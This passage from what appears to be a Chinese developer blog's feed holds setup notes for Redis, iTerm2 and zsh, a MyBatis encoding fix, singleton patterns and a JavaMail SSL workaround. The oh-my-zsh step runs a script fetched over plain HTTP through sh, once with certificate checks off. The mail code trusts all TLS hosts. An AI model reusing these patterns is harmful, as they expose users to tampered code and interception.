&#123;redis_port&#125;</span></span><br></pre></td></tr></table></figure></p><p>其中<code>{redis_host}</code>就是远程的Redis服务所在服务器地址，<code>{redis_port}</code>就是Redis服务端口（默认端口为6379）。<br>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_77_16_centos src]# ./redis-cli -h 你的ip -p 6379</span><br></pre></td></tr></table></figure></p><p>大功告成<br><img src="/images/redis_install/external_access_success.png" alt=""></p><p>三：redis的基本操作<br>关闭redis的两种方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 无密码</span><br><span class="line"># redis-cli shutdown</span><br><span class="line"></span><br><span class="line"># 有密码</span><br><span class="line"># redis-cli -a password shutdown</span><br><span class="line"></span><br><span class="line"># 查询redis的pid，关闭进程</span><br><span class="line"># ps aux | grep redis</span><br><span class="line"># kill -9 pid</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;先贴Redis官网：&lt;a href=&quot;https://redis.io/download&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://redis.io/download&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; wget http://download.redis.io/releases/redis-4.0.2.tar.gz&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; tar xzf redis-4.0.2.tar.gz&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; &lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; redis-4.0.2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; make&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果没有安装gcc，则会抛出这样的错误：&lt;br&gt;&lt;img src=&quot;/images/redis_install/redis_install_error.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; yum install gcc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在执行一次make可能会再抛出这样一个错误：&lt;br&gt;&lt;img src=&quot;/images/redis_install/redis_install_error2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这样的话便在make后加上参数&lt;br&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; make MALLOC=libc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;编译完成后&lt;br&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; src/redis-server  redis.conf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>从Terminal过渡到Item2</title>
    <link href="https://amosannn.github.io/2017/11/05/intalled-item2/"/>
    <id>https://amosannn.github.io/2017/11/05/intalled-item2/</id>
    <published>2017-11-04T17:25:27.000Z</published>
    <updated>2017-11-05T14:55:45.000Z</updated>
    
    <content type="html"><![CDATA[<p>一直听说item2是个比terminal强大的终端工具，为了提升命令行的体验，从teminal切换到了item2。</p><h2 id="下载Item2"><a href="#下载Item2" class="headerlink" title="下载Item2"></a>下载Item2</h2><p><a href="https://www.iterm2.com/downloads.html" target="_blank" rel="noopener">https://www.iterm2.com/downloads.html</a></p><h2 id="设置开启快捷键"><a href="#设置开启快捷键" class="headerlink" title="设置开启快捷键"></a>设置开启快捷键</h2><p>前提是item2在后台运行<br>-&gt; 进入preference(command ,)<br>-&gt; keys<br>-&gt; Hotkeys(左下角) 勾选<code>Show/hide iTerm2 with a system-wide hotkey</code><br>然后就按喜好设置快捷键啦</p><h2 id="配色方案"><a href="#配色方案" class="headerlink" title="配色方案"></a>配色方案</h2><p>可以自定终端背景色或导入现成的配色方案，比如<a href="http://ethanschoonover.com/solarized" target="_blank" rel="noopener">Solarized</a><br>跳到Download下载后选择相应的文件导入<br><img src="/images/item2-solarized-setting.png" alt=""><br>你可以选择双击’.itermcolors‘文件或在preference -&gt; profiles -&gt; colors -&gt; Color Presets（右下角）-&gt; import… 中导入</p><h2 id="安装zsh"><a href="#安装zsh" class="headerlink" title="安装zsh"></a>安装zsh</h2><p>osx中默认zsh为4.0版本，可直接切换使用或下载最新的5.0版本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install zsh</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>将zsh设置成系统默认shell，以代替bash。 用编辑器打开/etc/shells，在末尾添加/usr/local/bin/zsh,保存关闭。 在终端中执行以下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chsh -s /usr/<span class="built_in">local</span>/bin/zsh</span><br></pre></td></tr></table></figure></p><p>重启iTerm2</p><h2 id="安装oh-my-zsh"><a href="#安装oh-my-zsh" class="headerlink" title="安装oh-my-zsh"></a>安装oh-my-zsh</h2><p>纯傻瓜的方式对zsh进行配置并得到强大的功能，<a href="https://github.com/robbyrussell/oh-my-zsh" target="_blank" rel="noopener">官方地址</a><br>curl安装或使用wget<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -L http://install.ohmyz.sh | sh</span><br><span class="line"></span><br><span class="line">wget --no-check-certificate http://install.ohmyz.sh -O - | sh</span><br></pre></td></tr></table></figure></p><p>编辑 ~/.zshrc 文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi ~/.zshrc</span><br><span class="line"></span><br><span class="line">ZSH_THEME=<span class="string">"agnoster"</span>          <span class="comment"># 使用 agnoster 主题，很好很强大</span></span><br><span class="line">DEFAULT_USER=<span class="string">"你的用户名"</span>     <span class="comment"># 增加这一项，便可以隐藏掉路径前面那串用户名</span></span><br></pre></td></tr></table></figure></p><h2 id="解决乱码问题"><a href="#解决乱码问题" class="headerlink" title="解决乱码问题"></a>解决乱码问题</h2><p><img src="/images/item2_ scrambled.png" alt=""><br>装好后可能会出现乱码，这时就需要字体库支持<br>推荐使用powerline <a href="https://github.com/powerline/fonts" target="_blank" rel="noopener">https://github.com/powerline/fonts</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/powerline/fonts.git ~/powerline-fonts</span><br><span class="line">source ~/powerline-fonts/install.sh</span><br></pre></td></tr></table></figure></p><p>执行上面两段命令后，会输出这样一行成功提示<br>All Powerline fonts installed to /Users/superdanny/Library/Fonts</p><p>回到item2的preference，在profiles -&gt; Text -&gt; Font 中更改字体为 <code>for Powerline</code> 后缀的字体<br>重启item2后乱码问题解决</p><h2 id="指令高亮"><a href="#指令高亮" class="headerlink" title="指令高亮"></a>指令高亮</h2><p>输入正确命令显示绿色，错误则为红色(ls为绿，l为红)<br>克隆工程到目录（推荐.zshrc所在目录），并在.zshrc文件末尾加上执行内容（XXX为文件目录）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://github.com/zsh-users/zsh-syntax-highlighting.git</span><br><span class="line"></span><br><span class="line">vi ~/.zshrc</span><br><span class="line"><span class="built_in">source</span> XXX/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh</span><br></pre></td></tr></table></figure></p><p>并且需修改.zshrc中的plugin配置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plugins=(git zsh-syntax-highlighting) <span class="comment"># 自己按需把要用的 plugin 写上</span></span><br></pre></td></tr></table></figure></p><h2 id="修改vim配色"><a href="#修改vim配色" class="headerlink" title="修改vim配色"></a>修改vim配色</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ cd solarized</span><br><span class="line">$ cd vim-colors-solarized/colors</span><br><span class="line">$ mkdir -p ~/.vim/colors</span><br><span class="line">$ cp solarized.vim ~/.vim/colors/</span><br><span class="line"></span><br><span class="line">$ vi ~/.vimrc</span><br><span class="line">syntax enable</span><br><span class="line">set background=dark</span><br><span class="line">colorscheme solarized</span><br></pre></td></tr></table></figure><h2 id="修改ls配色"><a href="#修改ls配色" class="headerlink" title="修改ls配色"></a>修改ls配色</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ vi ~/.bash_profile</span><br><span class="line"><span class="built_in">export</span> CLICOLOR=1</span><br></pre></td></tr></table></figure><p>修改完.bash_profile需要source .bash_profile</p><p>大功告成啦，enjoy it!!</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一直听说item2是个比terminal强大的终端工具，为了提升命令行的体验，从teminal切换到了item2。&lt;/p&gt;
&lt;h2 id=&quot;下载Item2&quot;&gt;&lt;a href=&quot;#下载Item2&quot; class=&quot;headerlink&quot; title=&quot;下载Item2&quot;&gt;&lt;/a&gt;下载Item2&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.iterm2.com/downloads.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.iterm2.com/downloads.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;设置开启快捷键&quot;&gt;&lt;a href=&quot;#设置开启快捷键&quot; class=&quot;headerlink&quot; title=&quot;设置开启快捷键&quot;&gt;&lt;/a&gt;设置开启快捷键&lt;/h2&gt;&lt;p&gt;前提是item2在后台运行&lt;br&gt;-&amp;gt; 进入preference(command ,)&lt;br&gt;-&amp;gt; keys&lt;br&gt;-&amp;gt; Hotkeys(左下角) 勾选&lt;code&gt;Show/hide iTerm2 with a system-wide hotkey&lt;/code&gt;&lt;br&gt;然后就按喜好设置快捷键啦&lt;/p&gt;
&lt;h2 id=&quot;配色方案&quot;&gt;&lt;a href=&quot;#配色方案&quot; class=&quot;headerlink&quot; title=&quot;配色方案&quot;&gt;&lt;/a&gt;配色方案&lt;/h2&gt;&lt;p&gt;可以自定终端背景色或导入现成的配色方案，比如&lt;a href=&quot;http://ethanschoonover.com/solarized&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Solarized&lt;/a&gt;&lt;br&gt;跳到Download下载后选择相应的文件导入&lt;br&gt;&lt;img src=&quot;/images/item2-solarized-setting.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;你可以选择双击’.itermcolors‘文件或在preference -&amp;gt; profiles -&amp;gt; colors -&amp;gt; Color Presets（右下角）-&amp;gt; import… 中导入&lt;/p&gt;
&lt;h2 id=&quot;安装zsh&quot;&gt;&lt;a href=&quot;#安装zsh&quot; class=&quot;headerlink&quot; title=&quot;安装zsh&quot;&gt;&lt;/a&gt;安装zsh&lt;/h2&gt;&lt;p&gt;osx中默认zsh为4.0版本，可直接切换使用或下载最新的5.0版本&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;brew install zsh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Mybatis传值乱码</title>
    <link href="https://amosannn.github.io/2017/08/27/mybatis-encoding-garbled/"/>
    <id>https://amosannn.github.io/2017/08/27/mybatis-encoding-garbled/</id>
    <published>2017-08-27T15:57:16.000Z</published>
    <updated>2017-08-28T13:14:22.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分析问题"><a href="#分析问题" class="headerlink" title="分析问题"></a>分析问题</h1><h2 id="前端显示页面"><a href="#前端显示页面" class="headerlink" title="前端显示页面"></a>前端显示页面</h2><p><img src="/images/garbled_page1.png" alt=""></p><h2 id="数据库页面"><a href="#数据库页面" class="headerlink" title="数据库页面"></a>数据库页面</h2><p><img src="/images/garbled_db1.png" alt=""></p><h2 id="目前可以推测出的几种情况："><a href="#目前可以推测出的几种情况：" class="headerlink" title="目前可以推测出的几种情况："></a>目前可以推测出的几种情况：</h2><blockquote><p>数据库表的字符编码与服务端不同<br>字符编码为非utf-8,gbk等能识别中文的编码<br>配置文件出错（读取或编写格式</p></blockquote><a id="more"></a><p>试试手动插入数据<br><img src="/images/garbled_db2.png" alt=""><br>数据库显示正常，页面乱码<br>–&gt;排除数据库编码问题</p><h2 id="查看配置文件"><a href="#查看配置文件" class="headerlink" title="查看配置文件"></a>查看配置文件</h2><p><img src="/images/application_properties.png" alt=""><br>编码与数据库同为UTF-8</p><p>发现一段诡异代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spring.datasource.url=jdbc:mysql://localhost:3306/toutiao?useUnicode=true&amp;ampcharacterEncoding=UTF-8&amp;ampuseSSL=false</span><br></pre></td></tr></table></figure></p><h1 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h1><p>删除amp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spring.datasource.url=jdbc:mysql://localhost:3306/toutiao?useUnicode=true&amp;characterEncoding=utf8&amp;useSSL=false</span><br></pre></td></tr></table></figure></p><p>重启系统，乱码问题解决.<br><img src="/images/garbled_db3.png" alt=""><br><img src="/images/garbled_page2.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;分析问题&quot;&gt;&lt;a href=&quot;#分析问题&quot; class=&quot;headerlink&quot; title=&quot;分析问题&quot;&gt;&lt;/a&gt;分析问题&lt;/h1&gt;&lt;h2 id=&quot;前端显示页面&quot;&gt;&lt;a href=&quot;#前端显示页面&quot; class=&quot;headerlink&quot; title=&quot;前端显示页面&quot;&gt;&lt;/a&gt;前端显示页面&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/garbled_page1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;数据库页面&quot;&gt;&lt;a href=&quot;#数据库页面&quot; class=&quot;headerlink&quot; title=&quot;数据库页面&quot;&gt;&lt;/a&gt;数据库页面&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/garbled_db1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;目前可以推测出的几种情况：&quot;&gt;&lt;a href=&quot;#目前可以推测出的几种情况：&quot; class=&quot;headerlink&quot; title=&quot;目前可以推测出的几种情况：&quot;&gt;&lt;/a&gt;目前可以推测出的几种情况：&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;数据库表的字符编码与服务端不同&lt;br&gt;字符编码为非utf-8,gbk等能识别中文的编码&lt;br&gt;配置文件出错（读取或编写格式&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="技术一路走到黑" scheme="https://amosannn.github.io/categories/%E6%8A%80%E6%9C%AF%E4%B8%80%E8%B7%AF%E8%B5%B0%E5%88%B0%E9%BB%91/"/>
    
    
      <category term="Mybatis" scheme="https://amosannn.github.io/tags/Mybatis/"/>
    
      <category term="MySQL" scheme="https://amosannn.github.io/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>懒汉式单例中双重检查的好处</title>
    <link href="https://amosannn.github.io/2017/07/27/benefits-of-singleton-pattern-double-checking/"/>
    <id>https://amosannn.github.io/2017/07/27/benefits-of-singleton-pattern-double-checking/</id>
    <published>2017-07-27T02:17:41.000Z</published>
    <updated>2017-08-02T15:43:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>记得前阵子面试金山时碰到了这样一个问题</p><p>1）下面哪一种写法更好，为什么？<br>2）请写出另一种单例模式。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton singleton;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (singleton == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line">                singleton = <span class="keyword">new</span> Singleton();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> singleton;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton singleton;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (singleton == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (singleton == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    singleton = <span class="keyword">new</span> Singleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> singleton;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很显然，第一种代码块是线程不安全的。<br>比如说这种情况，有一个线程调用了getInstance()，但执行到if(singleton==null)这一步时，另一个线程也进入了这个方法，那么便会造成最终创建了两个Singleton实例。<br>而若是第二种代码块，在同步锁中加入第二次验证，就不怕多个线程同时进入方法体导致的多个实例被创建了。</p><p>以上两个方法块俗称懒汉式单例模式，意为调用时再创建实例对象。</p><p>另一种单例模式称为饿汉式单例模式，不同的点在于类装载时便完成了类实例化，以下两种方法块都是饿汉式的表现方法，是一样的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">new</span> Singleton();</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">     instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后再推荐个与双重检查一样线程安全的，静态内部类实现的懒汉式单例模式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> class <span class="title">Singleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">     <span class="keyword">private</span> Singleton&#123;&#125;;</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyHolder</span></span>&#123;</span><br><span class="line">          <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton INSTANCE = <span class="keyword">new</span> Singleton();</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">          <span class="keyword">return</span> LazyHolder.INSTANCE;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种方式跟饿汉式方式采用的机制类似，但又有不同。两者都是采用了类装载的机制来保证初始化实例时只有一个线程。不同的地方在饿汉式方式是只要Singleton类被装载就会实例化，没有Lazy-Loading的作用，而静态内部类方式在Singleton类被装载时并不会立即实例化，而是在需要实例化时，调用getInstance方法，才会装载SingletonInstance类，从而完成Singleton的实例化。</p><p>类的静态属性只会在第一次加载类的时候初始化，所以在这里，JVM帮助我们保证了线程的安全性，在类进行初始化时，别的线程是无法进入的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;记得前阵子面试金山时碰到了这样一个问题&lt;/p&gt;
&lt;p&gt;1）下面哪一种写法更好，为什么？&lt;br&gt;2）请写出另一种单例模式。&lt;br&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span c
      
    
    </summary>
    
      <category term="技术一路走到黑" scheme="https://amosannn.github.io/categories/%E6%8A%80%E6%9C%AF%E4%B8%80%E8%B7%AF%E8%B5%B0%E5%88%B0%E9%BB%91/"/>
    
    
      <category term="java" scheme="https://amosannn.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Java mail 报错 trying to connect to host &quot;*.*.com&quot;, port 587, isSSL true的另一种解决办法</title>
    <link href="https://amosannn.github.io/2017/07/18/trying-to-connect-to-host/"/>
    <id>https://amosannn.github.io/2017/07/18/trying-to-connect-to-host/</id>
    <published>2017-07-18T09:06:19.000Z</published>
    <updated>2017-08-02T15:44:25.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DEBUG SMTP: trying to connect to host &quot;xxx.xxx.com&quot;, port 587, isSSL true</span><br><span class="line">send failed... the exception is javax.mail.MessagingException: Could not connect to SMTP host: xxx.xxx.com, port: 587;</span><br><span class="line">  nested exception is:</span><br><span class="line">javax.net.ssl.SSLException: Unrecognized SSL message, plaintext connection?</span><br></pre></td></tr></table></figure><p>如果你遇到了这种报错，而其它办法又解决不了。<br>不妨试试调整properties的put()方法放置顺序吧。<br>起初我也觉得put()顺序并不会影响到后续的其他方法块对它的读取啊。<br>然而当我调转了它们的位置时，不再报错了。。<br>邮件成功的发送出去了。</p><p>这是我放置properties的方法块</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">MailSSLSocketFactory mssf = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">  mssf = <span class="keyword">new</span> MailSSLSocketFactory();</span><br><span class="line">  mssf.setTrustAllHosts(<span class="keyword">true</span>);</span><br><span class="line">  properties.put(<span class="string">"mail.smtp.ssl.socketFactory"</span>, mssf);</span><br><span class="line">  properties.put(<span class="string">"mail.smtp.ssl.enable"</span>, <span class="string">"true"</span>);</span><br><span class="line">  properties.put(<span class="string">"mail.smtp.port"</span>, <span class="string">"587"</span>);</span><br><span class="line">  properties.put(<span class="string">"mail.smtp.ssl.socketFactory.port"</span>, <span class="string">"587"</span>);</span><br><span class="line">  properties.setProperty(<span class="string">"mail.imap.ssl.socketFactory.class"</span>, <span class="string">"DummySSLSocketFactory"</span>);</span><br><span class="line">  properties.setProperty(<span class="string">"mail.imap.ssl.socketFactory.fallback"</span>, <span class="string">"false"</span>);</span><br><span class="line"><span class="comment">// properties.setProperty("mail.smtp.port", "587");</span></span><br><span class="line"><span class="comment">// properties.setProperty("mail.smtp.socketFactory.port", "587");</span></span><br><span class="line"><span class="comment">// properties.setProperty("mail.imap.ssl.enable", "true");</span></span><br><span class="line"><span class="comment">// properties.setProperty("mail.imap.ssl.socketFactory.class", "DummySSLSocketFactory");</span></span><br><span class="line"><span class="comment">// properties.setProperty("mail.imap.ssl.socketFactory.fallback", "false");</span></span><br><span class="line">  &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> GeneralSecurityException e) &#123;</span><br><span class="line">  e.printStackTrace();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>而你需要做的便是把</p><blockquote><p>properties.put(“mail.smtp.ssl.enable”, “true”);</p></blockquote><p>放在</p><blockquote><p>properties.put(“mail.smtp.port”, “587”);<br>properties.put(“mail.smtp.ssl.socketFactory.port”, “587”);</p></blockquote><p>的下面。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
      
    
    </summary>
    
